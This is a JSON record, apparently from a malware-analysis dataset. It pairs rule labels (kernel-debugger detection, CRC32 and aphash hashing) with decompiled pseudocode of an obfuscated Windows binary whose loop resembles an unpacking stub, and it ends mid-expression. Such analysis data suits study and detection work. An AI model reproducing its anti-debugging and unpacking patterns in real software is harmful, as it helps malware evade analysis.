{
    "00407829": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00407829(char *arg_8h)\n\n{\n    return 0x33 < *arg_8h - 0x23U;\n}\n",
        "token_count": 38
    },
    "00408963": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00408d3c) overlaps instruction at (ram,0x00408d3a)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Unable to track spacebase fully for stack\n\nuint32_t * fcn.00408963(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    ushort uVar4;\n    uint32_t **ppuVar5;\n    uint32_t uVar6;\n    uint32_t *puVar7;\n    uint8_t **ppuVar8;\n    uint8_t *puVar9;\n    uint8_t **ppuVar10;\n    char *pcVar11;\n    uchar *puVar12;\n    uint uVar13;\n    code *pcVar14;\n    int32_t iVar15;\n    uint8_t uVar16;\n    uint32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    ushort extraout_DX;\n    ushort extraout_DX_00;\n    ushort extraout_DX_01;\n    ushort extraout_DX_02;\n    ushort extraout_DX_03;\n    ushort extraout_DX_04;\n    ushort extraout_DX_05;\n    ushort extraout_DX_06;\n    ushort extraout_DX_07;\n    ushort extraout_DX_08;\n    ushort extraout_DX_09;\n    ushort extraout_DX_10;\n    ushort extraout_DX_11;\n    ushort extraout_DX_12;\n    ushort extraout_DX_13;\n    ushort extraout_DX_14;\n    ushort extraout_DX_15;\n    ushort extraout_DX_16;\n    ushort extraout_DX_17;\n    ushort extraout_DX_18;\n    ushort extraout_DX_19;\n    ushort extraout_DX_20;\n    uint extraout_EDX;\n    uint extraout_EDX_00;\n    uint extraout_EDX_01;\n    uint8_t *puVar17;\n    uint *puVar18;\n    uint32_t **ppuVar19;\n    uint32_t *puVar20;\n    uint32_t **ppuVar21;\n    uint32_t *puVar22;\n    uint8_t *puVar23;\n    uint8_t *puVar24;\n    uint8_t *puVar25;\n    uint32_t **ppuVar26;\n    uint32_t *puVar27;\n    uint8_t **ppuVar28;\n    uint8_t **ppuVar29;\n    uint8_t *puVar30;\n    uint8_t in_AF;\n    bool bVar31;\n    ulong uVar32;\n    uint32_t **ppuStack96;\n    uchar uStack92;\n    uchar uStack91;\n    uint32_t **ppuStack88;\n    uint uStack84;\n    uint8_t uStack77;\n    uint32_t **ppuStack76;\n    uint32_t uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint32_t uStack60;\n    uint32_t *puStack56;\n    uint32_t **ppuStack52;\n    uint32_t **ppuStack48;\n    uint32_t uStack44;\n    uint32_t **ppuStack40;\n    uint32_t uStack36;\n    uint32_t **ppuStack32;\n    uint32_t **ppuStack28;\n    \n    ppuVar5 = _sym.imp.KERNEL32.dll_DeleteFiber;\n    puStack64 = &stack0xffffffd0;\n    ppuStack40 = 0x7b11a141;\n    puVar30 = NULL;\n    uStack60 = ppuStack32;\n    uVar3 = ppuStack32 & 0x1f;\n    ppuVar19 = 0x6bde928a << (ppuStack32 & 0x1f);\n    uVar6 = ppuStack32 & 0x20;\n    ppuStack32 = ppuVar19;\n    ppuStack28 = 0 << uVar3 | 0x6bde928aU >> 0x20 - uVar3;\n    if (uVar6 != 0) {\n        ppuStack32 = NULL;\n        ppuStack28 = ppuVar19;\n    }\n    uStack44 = 0x7e06d100;\n    (*_sym.imp.KERNEL32.dll_DeleteFiber)();\n    ppuVar19 = ppuVar5 + 1;\n    ppuVar5 = *ppuVar5;\n    bVar31 = ppuVar19 == NULL;\n    ppuVar21 = ppuVar5;\n    if (ppuVar19 < 0) {\n        out(extraout_DX, ppuVar5);\n        out(0xd0, ppuVar5);\n        ppuVar21 = ppuVar19;\n        ppuVar19 = ppuVar5;\n        if (!bVar31) goto code_r0x004089d5;\ncode_r0x00408a3d:\n        ppuStack76 = ppuVar21;\n        if (!bVar31) goto code_r0x00409087;\n        (*_sym.imp.KERNEL32.dll_GetProfileSectionA)();\n        ppuVar26 = ppuVar21 + 1;\n        ppuVar21 = *ppuVar21;\n        ppuVar19 = ppuVar21;\n        ppuVar5 = ppuVar26;\n        if (ppuVar26 < 0) {\n            out(extraout_DX_01, ppuVar21);\n            out(0xd0, ppuVar21);\n            ppuVar19 = ppuVar26;\n            ppuVar5 = ppuVar21;\n            if (ppuVar26 == NULL) {\n                pcVar11 = extraout_ECX & 0xffff0000 | CONCAT11(0x2e, extraout_ECX);\n                *pcVar11 = *pcVar11 - (extraout_DX_01 >> 8);\n                ppuVar21 = ppuVar21 + -0x1dbd36ed;\n                uVar3 = extraout_ECX & 7;\n                *ppuVar21 = *ppuVar21 >> uVar3 | *ppuVar21 << 8 - uVar3;\n                goto code_r0x00408acc;\n            }\n        }\n    }\n    else {\ncode_r0x004089d5:\n        out(0xd7, ppuVar21);\n        uVar4 = func_0x42654bcd();\n        *(ppuVar19 + 0x8263fb6) = *(ppuVar19 + 0x8263fb6) & uVar4 >> 8;\n        puVar7 = _sym.imp.USER32.dll_GetMenu;\n        in_AF = 9 < (uVar4 & 0xf) | in_AF;\n        *0x6bdb02a6 = *0x6bdb02a6 & ppuStack88;\n        ppuStack88 = 0x4089fd;\n        (*_sym.imp.USER32.dll_GetMenu)();\n        ppuVar5 = puVar7 + 1;\n        ppuVar19 = *puVar7;\n        ppuVar21 = ppuVar19;\n        ppuVar26 = ppuVar5;\n        if (-1 < ppuVar5) {\ncode_r0x00408a0e:\n            out(0xd7, ppuVar21);\n            uVar32 = func_0x42654c06();\n            uStack68 = uVar32 >> 0x20;\n            uVar3 = uVar32 >> 8;\n            *(ppuVar26 + 0x8263fb6) = *(ppuVar26 + 0x8263fb6) & uVar3;\n            in_AF = 9 < (uVar32 & 0xf) | in_AF;\n            uStack72 = uVar32 & 0xffff0000 | CONCAT11(uVar3 - in_AF, uVar32 + in_AF * -6) & 0xff0f;\n            *0x6bdb02a6 = *0x6bdb02a6 & 0x408a1f;\n            bVar31 = ppuStack48 == NULL;\n            ppuVar21 = ppuStack48;\n            goto code_r0x00408a3d;\n        }\n        out(extraout_DX_00, ppuVar19);\n        out(0xd0, ppuVar19);\n        ppuVar21 = ppuVar5;\n        ppuVar26 = ppuVar19;\n        if (ppuVar5 != NULL) goto code_r0x00408a0e;\n        out(0xc1, ppuVar19);\n        ppuVar19 = ppuVar19 & 0xffffff42;\n    }\n    out(0xd7, ppuVar19);\n    uVar4 = func_0x42654c64();\n    *(ppuVar5 + 0x8263fb6) = *(ppuVar5 + 0x8263fb6) & uVar4 >> 8;\n    in_AF = 9 < (uVar4 & 0xf) | in_AF;\n    ppuVar21 = 0x408a7d;\n    *0x6bdb02a6 = *0x6bdb02a6 & 0x408a7d;\n    if (ppuStack48 == NULL) goto code_r0x00408efd;\ncode_r0x00409087:\n    uStack92 = 0x8e;\n    uStack91 = 0x90;\n    (*_sym.imp.KERNEL32.dll_FindFirstVolumeW)();\n    puVar7 = *ppuVar21;\n    puVar27 = ppuVar21 + 1 + puVar30;\n    puVar22 = puVar7;\n    puVar20 = puVar27;\n    if (puVar27 < 0) {\n        out(extraout_DX_19, puVar7);\n        out(0xd0, puVar7);\n        puVar22 = puVar27;\n        puVar20 = puVar7;\n        if (puVar27 == NULL) goto code_r0x00409107;\n    }\n    out(0xd7, puVar22);\n    uVar4 = func_0x42655297();\n    *(puVar20 + 0x8263fb6) = *(puVar20 + 0x8263fb6) & uVar4 >> 8;\n    in_AF = 9 < (uVar4 & 0xf) | in_AF;\n    ppuVar21 = 0x40908e;\n    *0x6bdb02a6 = *0x6bdb02a6 & 0x40908e;\n    if (ppuStack48 == NULL) {\n        (*_sym.imp.KERNEL32.dll_FindResourceA)();\n        ppuVar28 = puVar30 + 0x409092;\n        ppuVar8 = *0x40908e;\n        ppuVar10 = ppuVar28;\n        if (ppuVar28 < 0) {\n            out(extraout_DX_12, *0x40908e);\n            out(0xd0, *0x40908e);\n            ppuVar8 = ppuVar28;\n            ppuVar10 = *0x40908e;\n            if (ppuVar28 == NULL) {\ncode_r0x00408e75:\n                if (ppuStack48 == NULL) goto code_r0x00408c75;\ncode_r0x00408cfd:\n                do {\n                    (*_sym.imp.USER32.dll_GetMessageTime)();\n                    puVar9 = *ppuVar28;\n                    puVar25 = ppuVar28 + 1 + puVar30;\n                    puVar23 = puVar9;\n                    puVar24 = puVar25;\n                    if (puVar25 < 0) {\n                        uVar3 = puVar9;\n                        out(extraout_DX_09, uVar3);\n                        out(0xd0, uVar3);\n                        puVar23 = puVar25;\n                        puVar24 = puVar9;\n                        if (puVar25 == NULL) {\n                            *puVar30 = uVar3;\n                            pcVar14 = swi(1);\n                            puVar7 = (*pcVar14)();\n                            return puVar7;\n                        }\n                    }\n                    out(0xd7, puVar23);\n                    uVar4 = func_0x42654f0d();\n                    puVar24[0x2098fed8] = puVar24[0x2098fed8] & uVar4 >> 8;\n                    in_AF = 9 < (uVar4 & 0xf) | in_AF;\n                    ppuVar28 = 0x408d26;\n                    *0x6bdb02a6 = *0x6bdb02a6 & 0x408d26;\n                } while (ppuStack48 != NULL);\n                uStack92 = 0xc3;\n                (*_sym.imp.USER32.dll_GetKeyboardLayoutNameA)();\n                puVar24 = puVar30 + 0x408d2a;\n                puVar9 = *0x408d26;\n                puVar23 = puVar24;\n                if (puVar24 < 0) {\n                    out(extraout_DX_08, *0x408d26);\n                    out(0xd0, *0x408d26);\n                    puVar9 = puVar24;\n                    puVar23 = *0x408d26;\n                    if (puVar24 == NULL) {\n                        if (0xffbf72d5 < puVar30) {\n    // WARNING: Bad instruction - Truncating control flow here\n                            halt_baddata();\n                        }\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\n                }\ncode_r0x00408cd4:\n                out(0xd7, puVar9);\n                ppuStack88 = ppuStack88 & 0xffffff00;\n                uVar6 = func_0x42654ecc();\n                uVar3 = uVar6 >> 8;\n                puVar23[0x2098fed8] = puVar23[0x2098fed8] & uVar3;\n                in_AF = 9 < (uVar6 & 0xf) | in_AF;\n                *0x6bdb02a6 = *0x6bdb02a6 & CONCAT22(0x408c, CONCAT11(0xe5, uStack92));\n                return uVar6 & 0xffff0000 | CONCAT11(uVar3 - in_AF, uVar6 + in_AF * -6) & 0xff0f;\n            }\n        }\n        out(0xd7, ppuVar8);\n        uStack92 = 0x1e;\n        uStack91 = 0x8e;\n        uVar4 = func_0x42655005();\n        *(ppuVar10 + 0x8263fb6) = *(ppuVar10 + 0x8263fb6) & uVar4 >> 8;\n        in_AF = 9 < (uVar4 & 0xf) | in_AF;\n        goto code_r0x00408e24;\n    }\ncode_r0x00408bc5:\n    uStack92 = 0xd6;\n    uStack91 = 0x8b;\n    (*_sym.imp.KERNEL32.dll_lstrlenA)();\n    puVar7 = *ppuVar21;\n    puVar27 = ppuVar21 + 1 + puVar30;\n    puVar22 = puVar7;\n    puVar20 = puVar27;\n    if (-1 < puVar27) {\ncode_r0x00408be7:\n        out(0xd7, puVar22);\n        ppuStack96 = 0x408bf8;\n        uVar6 = func_0x42654ddf();\n        uVar3 = uVar6 >> 8;\n        *(puVar20 + 0x8263fb6) = *(puVar20 + 0x8263fb6) & uVar3;\n        in_AF = 9 < (uVar6 & 0xf) | in_AF;\n        puStack56 = uVar6 & 0xffff0000 | CONCAT11(uVar3 - in_AF, uVar6 + in_AF * -6) & 0xff0f;\n        do {\n            ppuVar19 = ppuStack96;\n            ppuVar5 = CONCAT22(0x40, CONCAT11(0x8b, uStack92));\n            *0x6bdb02a6 = *0x6bdb02a6 & ppuVar5;\n            if ((ppuStack48 & 1) != 0) {\n                return puStack56;\n            }\n            uStack92 = 0x14;\n            (*_sym.imp.KERNEL32.dll_FatalAppExitA)();\n            puVar7 = *ppuVar5;\n            puVar20 = ppuVar5 + 1 + puVar30;\n            bVar31 = puVar20 == NULL;\n            puVar22 = puVar7;\n            if (puVar20 < 0) {\n                out(extraout_DX_02, puVar7);\n                out(0xd0, puVar7);\n                puVar22 = puVar20;\n                puVar20 = puVar7;\n                uVar4 = extraout_DX_02;\n                if (!bVar31) goto code_r0x00408b25;\n            }\n            else {\ncode_r0x00408b25:\n                out(0xd7, puVar22);\n                uVar4 = func_0x42654d1d();\n                *(puVar20 + 0x8263fb6) = *(puVar20 + 0x8263fb6) & uVar4 >> 8;\n                in_AF = 9 < (uVar4 & 0xf) | in_AF;\n                *0x6bdb02a6 = *0x6bdb02a6 & ppuStack96;\n                ppuStack96 = 0x408b4c;\n                (*_sym.imp.SHELL32.dll_ExtractAssociatedIconA)();\n                ppuVar5 = *ppuVar19;\n                ppuVar21 = ppuVar19 + 1 + puVar30;\n                ppuVar19 = ppuVar5;\n                ppuVar26 = ppuVar21;\n                if (ppuVar21 < 0) {\n                    out(extraout_DX_03, ppuVar5);\n                    out(0xd0, ppuVar5);\n                    ppuVar19 = ppuVar21;\n                    ppuVar26 = ppuVar5;\n                    if (ppuVar21 == NULL) goto code_r0x00408bc5;\n                }\n                out(0xd7, ppuVar19);\n                uStack92 = 0x6e;\n                uVar4 = func_0x42654d55();\n                ppuVar5 = ppuStack88;\n                *(ppuVar26 + 0x8263fb6) = *(ppuVar26 + 0x8263fb6) & uVar4 >> 8;\n                in_AF = 9 < (uVar4 & 0xf) | in_AF;\n                *0x6bdb02a6 = *0x6bdb02a6 & ppuStack88;\n                ppuStack88 = 0x408b84;\n                (*_sym.imp.KERNEL32.dll_FreeConsole)();\n                puVar20 = *ppuVar5;\n                puVar22 = ppuVar5 + 1 + puVar30;\n                bVar31 = puVar22 == NULL;\n                puVar7 = puVar20;\n                uVar4 = extraout_DX_04;\n                if (-1 < puVar22) goto code_r0x00408b95;\n            }\n            puVar20 = puVar22;\n            out(uVar4, puVar7);\n            out(0xd0, puVar7);\n            puVar22 = puVar7;\n            if (!bVar31) goto code_r0x00408b95;\n            puStack56 = puVar7;\n            *puVar30 = *puVar30 & 0xbe;\n        } while( true );\n    }\n    out(extraout_DX_05, puVar7);\n    out(0xd0, puVar7);\n    puVar22 = puVar27;\n    puVar20 = puVar7;\n    if (puVar27 != NULL) goto code_r0x00408be7;\n    *puVar30 = *puVar30 & 0xbe;\n    goto code_r0x00408c51;\ncode_r0x00408b95:\n    out(0xd7, puVar20);\n    uVar4 = func_0x42654d8d();\n    *(puVar22 + 0x8263fb6) = *(puVar22 + 0x8263fb6) & uVar4 >> 8;\n    in_AF = 9 < (uVar4 & 0xf) | in_AF;\n    ppuVar21 = CONCAT22(0x40, CONCAT11(0x8b, uStack92));\n    *0x6bdb02a6 = *0x6bdb02a6 & ppuVar21;\n    if (ppuStack48 != NULL) {\ncode_r0x00408d42:\n        (*_sym.imp.USER32.dll_GetMenuDefaultItem)();\n        puVar7 = *ppuVar21;\n        puVar27 = ppuVar21 + 1 + puVar30;\n        puVar22 = puVar7;\n        puVar20 = puVar27;\n        if (puVar27 < 0) {\n            out(extraout_DX_10, puVar7);\n            out(0xd0, puVar7);\n            puVar22 = puVar27;\n            puVar20 = puVar7;\n            if (puVar27 == NULL) {\n                return puVar7;\n            }\n        }\n        out(0xd7, puVar22);\n        uVar4 = func_0x42654f52();\n        *(puVar20 + 0x8263fb6) = *(puVar20 + 0x8263fb6) & uVar4 >> 8;\n        in_AF = 9 < (uVar4 & 0xf) | in_AF;\n        ppuVar28 = 0x408d6b;\n        *0x6bdb02a6 = *0x6bdb02a6 & 0x408d6b;\n        uStack36 = ppuStack76 ^ 0x4a240277;\n        ppuStack52 = ppuStack48;\n        if (uStack44 == 0x2aaa661) goto code_r0x00408c75;\ncode_r0x00408acc:\n        uStack77 = uStack60;\n        ppuVar5 = 0x182eb5cb << (uStack77 & 0x1f);\n        ppuStack32 = ppuVar5;\n        ppuVar21 = 0 << (uStack77 & 0x1f) | 0x182eb5cbU >> 0x20 - (uStack77 & 0x1f);\n        if ((uStack60 & 0x20) != 0) {\n            ppuStack32 = NULL;\n            ppuVar21 = ppuVar5;\n        }\n        ppuStack28 = ppuVar21;\n        if (ppuStack52 != NULL) goto code_r0x00409012;\n        (*_sym.imp.GDI32.dll_GetRandomRgn)();\n        ppuVar21 = *ppuVar21;\n        ppuVar5 = ppuVar21 + 1 + puVar30;\n        ppuVar19 = ppuVar21;\n        ppuVar26 = ppuVar5;\n        if (ppuVar5 < 0) {\n            out(extraout_EDX, ppuVar21);\n            out(0xd0, ppuVar21);\n            ppuVar19 = ppuVar5;\n            uVar13 = extraout_EDX;\n            ppuVar26 = ppuVar21;\n            if (ppuVar5 != NULL) goto code_r0x00408e9d;\n            while( true ) {\n                ppuVar5 = ppuVar5 + puVar30;\n                ppuVar19 = ppuVar21;\n                ppuVar26 = ppuVar5;\n                if (ppuVar5 < 0) {\n                    out(uVar13, ppuVar21);\n                    out(0xd0, ppuVar21);\n                    ppuVar19 = ppuVar5;\n                    ppuVar26 = ppuVar21;\n                    if (ppuVar5 == NULL) {\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\n                }\n                out(0xd7, ppuVar19);\n                uVar4 = func_0x4265510d();\n                ppuVar19 = ppuStack88;\n                *(ppuVar26 + 0x8263fb6) = *(ppuVar26 + 0x8263fb6) & uVar4 >> 8;\n                in_AF = 9 < (uVar4 & 0xf) | in_AF;\n                *0x6bdb02a6 = *0x6bdb02a6 & ppuStack88;\n                ppuStack88 = 0x408f3c;\n                (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n                ppuVar5 = *ppuVar19;\n                ppuVar26 = ppuVar19 + 1 + puVar30;\n                ppuVar19 = ppuVar5;\n                ppuVar21 = ppuVar26;\n                if (ppuVar26 < 0) {\n                    out(extraout_DX_14, ppuVar5);\n                    out(0xd0, ppuVar5);\n                    ppuVar19 = ppuVar26;\n                    ppuVar21 = ppuVar5;\n                    if (ppuVar26 == NULL) {\n                        out(0xc1, ppuVar5);\n                        ppuVar5 = ppuVar5 & 0xffffff42;\n                        goto code_r0x00408faa;\n                    }\n                }\n                out(0xd7, ppuVar19);\n                uVar4 = func_0x42655145();\n                *(ppuVar21 + 0x8263fb6) = *(ppuVar21 + 0x8263fb6) & uVar4 >> 8;\n                in_AF = 9 < (uVar4 & 0xf) | in_AF;\n                ppuVar21 = 0x408f5e;\n                *0x6bdb02a6 = *0x6bdb02a6 & 0x408f5e;\n                uStack36 = 0x44763d51;\n                puStack56 = 0xfffffffd;\n                if ((ppuStack48 & 1) != 0) {\n                    return 0xfffffffd;\n                }\n                ppuStack28 = 0xffffffff;\n                ppuStack32 = 0xe1997995;\n                if (ppuStack40 + 0x9adab941U <= (uStack44 & 0x745a32ce)) break;\ncode_r0x00408efd:\n                (*_sym.imp.ADVAPI32.dll_DeregisterEventSource)();\n                ppuVar5 = ppuVar21 + 1;\n                ppuVar21 = *ppuVar21;\n                uVar13 = extraout_EDX_00;\n            }\n            (*_sym.imp.ADVAPI32.dll_EnumServicesStatusA)();\n            puVar9 = *0x408f5e;\n            puVar25 = puVar30 + 0x408f62;\n            puVar23 = *0x408f5e;\n            puVar24 = puVar25;\n            if (puVar25 < 0) {\n                out(extraout_EDX_01, *0x408f5e);\n                out(0xd0, *0x408f5e);\n                puVar23 = puVar25;\n                puVar24 = *0x408f5e;\n                if (puVar25 == NULL) {\n                    pcVar11 = &stack0xffffffa8 & 0xffffff84;\n                    *pcVar11 = *pcVar11 + pcVar11;\n                    puVar30 = extraout_ECX_00 + -0x42097e2a;\n                    uVar3 = *puVar30;\n                    uVar16 = extraout_ECX_00;\n                    *puVar30 = *puVar30 + uVar16;\n                    *(extraout_ECX_00 + -0x3893db8c) = *(extraout_ECX_00 + -0x3893db8c) + uVar16 + CARRY1(uVar3, uVar16)\n                    ;\n                    puVar17 = puVar9 + 1;\n                    puVar12 = &stack0xffffffa8 & 0xffffff04;\n                    *puVar12 = *puVar12;\n                    *puVar12 = *puVar12;\n                    *(puVar9 + 0x19) = puVar12;\n                    *(puVar9 + 0x15) = extraout_ECX_00;\n                    *(puVar9 + 0x11) = extraout_EDX_01;\n                    do {\n                        *(puVar9 + 0x89) = *(puVar9 + 0x11);\n                        iVar15 = *(puVar9 + 0x75);\n                        *(puVar9 + 0x61) =\n                             *(iVar15 * 0x22c + 0x40b228) + *(puVar9 + 0x6d) + *(iVar15 * 0x22c + 0x40b158);\n                        *(puVar9 + 0x21) = 0;\n                        *(puVar9 + 0x6d) = *(puVar9 + 0x61);\n                        *(puVar9 + 0x75) = iVar15 + 1;\n                    } while (iVar15 + 1 != 0x1057b3f5 - *(puVar9 + 0x85));\n                    do {\n                        iVar15 = *(puVar9 + 0x21);\n                        puVar9[iVar15 + 0x3d] = *(iVar15 + 0x4076e1) - *(iVar15 + 0x407719);\n                        *(puVar9 + 0x21) = iVar15 + 1;\n                    } while (iVar15 + 1 != 0xe);\ncode_r0x00409219:\n                    *(puVar17 + 0xc) = 0x648cb98;\n                    *(puVar17 + -4) = 0x409227;\n                    uVar13 = fcn.00409ddf();\n                    *(puVar17 + -4) = *(puVar17 + 0x14);\n                    *(puVar17 + -8) = uVar13;\n                    *(puVar17 + -0xc) = 0x409232;\n                    pcVar14 = fcn.0040806a(*(puVar17 + -8), *(puVar17 + -4));\n                    *(puVar17 + -4) = 0x1057b3c1 - *(puVar17 + 0x84);\n                    *(puVar17 + -8) = 0x1000;\n                    *(puVar17 + -0xc) = *(puVar17 + 0x60);\n                    *(puVar17 + -0x10) = 0;\n                    puVar18 = puVar17 + -0x14;\n                    puVar17 = puVar17 + -0x14;\n                    *puVar18 = 0x409252;\n                    iVar15 = (*pcVar14)();\n                    *(puVar17 + 0x24) = iVar15;\n                    piVar1 = *(puVar17 + 0x18);\n                    *piVar1 = iVar15 + 0x5dc2;\n                    uVar6 = *(puVar17 + 0x78);\n                    *(puVar17 + 0x78) = uVar6 + 0x4c5aee7e;\n                    *(puVar17 + 0x7c) = *(puVar17 + 0x7c) + (0xb3a51181 < uVar6);\n                    piVar1[1] = 0x12a00;\n                    *(puVar17 + 0x88) = 0x7e76e138;\n                    *(puVar17 + 0x7c) = 0;\n                    *(puVar17 + 0x78) = 0x5a2d00ef;\n                    iVar15 = *(puVar17 + 0x84);\n                    uVar6 = *(puVar17 + 0x84);\n                    piVar1[2] = *(puVar17 + 0x24) + 0x177c;\n                    piVar1[3] = iVar15 + -0x1057710d;\n                    *(puVar17 + 0x38) = uVar6 ^ 0x1057b3bd;\n                    *(puVar17 + 0x88) = *(puVar17 + 0x10) << (*(puVar17 + 0xc) & 0x1f);\n                    *(puVar17 + 0x1c) = 0;\n                    do {\n                        *(puVar17 + 0x70) = *(puVar17 + 0x1c);\n                        *(puVar17 + 0x2c) = *(puVar17 + 0x38);\n                        iVar15 = *(*(puVar17 + 0x70) * 0x22c + 0x40b228);\n                        *(puVar17 + 0x30) = *(*(puVar17 + 0x70) * 0x22c + 0x40b15c);\n                        iVar2 = *(*(puVar17 + 0x70) * 0x22c + 0x40b158);\n                        *(puVar17 + 0x28) = *(puVar17 + 0x2c) + *(puVar17 + 0x24);\n                        **(puVar17 + 0x28) = **(puVar17 + 0x30);\n                        *(puVar17 + 0x68) = iVar2 + iVar15;\n                        *(puVar17 + 100) = 0;\n                        if (*(puVar17 + 0x68) != 0) {\n                            do {\n                                *(puVar17 + 0x88) = 0x19fab8ae;\n                                iVar15 = *(puVar17 + 100);\n                                iVar2 = *(puVar17 + 0x5c);\n                                uVar6 = *(puVar17 + 0x84);\n                                *(*(puVar17 + 0x28) + iVar15) = *(*(puVar17 + 0x30) + iVar15);\n                                *(puVar17 + 0x34) = iVar15 + 1;\n                                if (iVar2 - (uVar6 ^ 0x403b12c1) < 0x3eda2a16) goto code_r0x00409219;\n                                *(puVar17 + 100) = *(puVar17 + 0x34);\n                            } while (*(puVar17 + 0x34) != *(puVar17 + 0x68));\n                        }\n                        *(puVar17 + -4) = 0x409407;\n                        uVar13 = fcn.00409ddf();\n                        *(puVar17 + -8) = uVar13;\n                        *(puVar17 + -4) = *(puVar17 + 0x14);\n                        *(puVar17 + -0xc) = 0x40941a;\n                        uVar13 = fcn.0040806a(*(puVar17 + -8), *(puVar17 + -4));\n                        *(puVar17 + 0x38) = *(puVar17 + 0x68) + *(puVar17 + 0x2c);\n                        *(puVar17 + 0x1c) = *(puVar17 + 0x70) + 1;\n                        *(puVar17 + 8) = uVar13;\n                        if (*(puVar17 + 0x70) + 1 == 0x38) {\n                            *(puVar17 + -0xc) = *(puVar17 + 0x24);\n                            *(puVar17 + -8) = *(puVar17 + 0x24);\n                            *(puVar17 + -4) = *(puVar17 + 0x60);\n                            *(puVar17 + -0x10) = 0x40945e;\n                            uVar13 = fcn.00408717(*(puVar17 + -0xc), *(puVar17 + -8), *(puVar17 + -4));\n                            *(puVar17 + 4) = uVar13;\n                            return NULL;\n                        }\n                    } while( true );\n                }\n            }\n            out(0xd7, puVar23);\n            uVar4 = func_0x42655324();\n            puVar24[0x2098fed8] = puVar24[0x2098fed8] & uVar4 >> 8;\n            in_AF = 9 < (uVar4 & 0xf) | in_AF;\n            ppuVar28 = 0x40913d;\n            *0x6bdb02a6 = *0x6bdb02a6 & 0x40913d;\n            if (ppuStack48 != NULL) goto code_r0x00408c75;\n            uStack92 = 0xab;\n            uStack91 = 0x8d;\n            (*_sym.imp.Secur32.dll_FreeCredentialsHandle)();\n            puVar24 = puVar30 + 0x409141;\n            puVar9 = *0x40913d;\n            puVar23 = puVar24;\n            if (puVar24 < 0) {\n                out(extraout_DX_11, *0x40913d);\n                out(0xd0, *0x40913d);\n                puVar9 = puVar24;\n                puVar23 = *0x40913d;\n                if (puVar24 == NULL) goto code_r0x00408e24;\n            }\n            out(0xd7, puVar9);\n            uVar4 = func_0x42654fb4();\n            puVar23[0x2098fed8] = puVar23[0x2098fed8] & uVar4 >> 8;\n            in_AF = 9 < (uVar4 & 0xf) | in_AF;\n            *0x6bdb02a6 = *0x6bdb02a6 & 0x408dab;\n            puStack56 = 0x5;\n            if ((ppuStack48 & 1) != 0) {\n                return 0x5;\n            }\n            (*_sym.imp.GDI32.dll_GetCurrentPositionEx)();\n            puVar24 = puVar30 + 0x408daf;\n            puVar9 = *0x408dab;\n            puVar23 = puVar24;\n            if (-1 < puVar24) {\ncode_r0x00408e55:\n                out(0xd7, puVar9);\n                uVar4 = func_0x4265504d();\n                puVar23[0x2098fed8] = puVar23[0x2098fed8] & uVar4 >> 8;\n                in_AF = 9 < (uVar4 & 0xf) | in_AF;\n                ppuVar28 = 0x408e66;\n                *0x6bdb02a6 = *0x6bdb02a6 & 0x408e66;\n                goto code_r0x00408e75;\n            }\n            out(extraout_DX_13, *0x408dab);\n            out(0xd0, *0x408dab);\n            puVar9 = puVar24;\n            puVar23 = *0x408dab;\n            if (puVar24 != NULL) goto code_r0x00408e55;\n        }\n        else {\ncode_r0x00408e9d:\n            out(0xd7, ppuVar19);\n            uVar4 = func_0x42655095();\n            *(ppuVar26 + 0x8263fb6) = *(ppuVar26 + 0x8263fb6) & uVar4 >> 8;\n            in_AF = 9 < (uVar4 & 0xf) | in_AF;\n            *0x6bdb02a6 = *0x6bdb02a6 & 0x408eae;\n        }\n        ppuVar5 = ppuStack40;\n        uStack84 = 0x333d9f2d;\n        uStack36 = 0x333d9f2d >> (ppuStack76 & 0x1f);\n        puVar30 = ppuStack48 & 1;\n        puStack56 = 0x7;\n        if (puVar30 != 0x7b11a141 - ppuStack40) {\n            return 0x7;\n        }\n        (*_sym.imp.KERNEL32.dll_EnumTimeFormatsA)();\n        ppuVar19 = *ppuVar5;\n        ppuVar21 = ppuVar5 + 1 + puVar30;\n        ppuVar5 = ppuVar19;\n        ppuVar26 = ppuVar21;\n        if (ppuVar21 < 0) {\n            out(extraout_DX_15, ppuVar19);\n            out(0xd0, ppuVar19);\n            ppuVar5 = ppuVar21;\n            ppuVar26 = ppuVar19;\n            if (ppuVar21 == NULL) goto code_r0x00409012;\n        }\ncode_r0x00408faa:\n        out(0xd7, ppuVar5);\n        uVar4 = func_0x426551a2();\n        ppuVar5 = ppuStack88;\n        *(ppuVar26 + 0x8263fb6) = *(ppuVar26 + 0x8263fb6) & uVar4 >> 8;\n        in_AF = 9 < (uVar4 & 0xf) | in_AF;\n        *0x6bdb02a6 = *0x6bdb02a6 & ppuStack88;\n        ppuStack88 = 0x408fd1;\n        (*_sym.imp.KERNEL32.dll_GlobalLock)();\n        ppuVar19 = *ppuVar5;\n        ppuVar5 = ppuVar5 + 1 + puVar30;\n        ppuVar21 = ppuVar19;\n        ppuVar26 = ppuVar5;\n        if (ppuVar5 < 0) {\n            out(extraout_DX_16, ppuVar19);\n            out(0xd0, ppuVar19);\n            ppuVar21 = ppuVar5;\n            ppuVar26 = ppuVar19;\n            if (ppuVar5 == NULL) goto code_r0x0040904a;\n        }\n        out(0xd7, ppuVar21);\n        ppuStack88 = 0x408ff3;\n        uVar4 = func_0x426551da();\n        *(ppuVar26 + 0x8263fb6) = *(ppuVar26 + 0x8263fb6) & uVar4 >> 8;\n        in_AF = 9 < (uVar4 & 0xf) | in_AF;\n        ppuVar5 = 0x408fbb;\n        *0x6bdb02a6 = *0x6bdb02a6 & 0x408fbb;\n        if (ppuStack48 == NULL) goto code_r0x00408c20;\n        while( true ) {\n            uStack36 = 0x6cb13db4;\n            (*_sym.imp.USER32.dll_GetPriorityClipboardFormat)();\n            ppuVar8 = *ppuVar5;\n            ppuVar28 = ppuVar5 + 1 + 